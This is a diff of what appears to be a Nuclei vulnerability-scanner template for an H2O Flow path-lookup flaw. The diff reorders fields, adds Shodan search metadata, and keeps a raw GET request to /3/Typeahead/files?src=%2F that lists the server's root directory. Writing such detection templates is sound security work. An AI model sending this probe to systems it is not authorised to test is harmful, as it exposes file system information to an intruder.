@@ -1,5 +1,4 @@
-id: h2o-Arbitrary-file-read
-
+id: h2o-arbitary-file-read
 info:
   name: H2O - Arbitrary Path Lookup
   author: danmcinerney,byt3bl33d3r
@@ -12,33 +11,30 @@ info:
     cwe-id: CWE-200
     cpe: cpe:2.3:a:h2o:h2o:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
+    product: h2o
+    shodan-query: title:"H2O Flow"
     vendor: h2o
-  tags: h2o-3,h2o,info-leak,lfi,misconfig,vuln
-
+    verified: true
+  tags: h2o,h2o-3,info-leak,lfi,misconfig,vuln
 http:
-  - raw:
-      - |
-        GET /3/Typeahead/files?src=%2F&limit=10 HTTP/1.1
-        Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
           - '"/bin"'
           - '"__meta":'
           - '"schema_name":'
-        condition: and
-
-      - type: word
-        part: header
+      - part: header
+        type: word
         words:
-          - "application/json"
-
-      - type: status
-        status:
+          - application/json
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    raw:
+      - |
+        GET /3/Typeahead/files?src=%2F&limit=10 HTTP/1.1
+        Host: {{Hostname}}
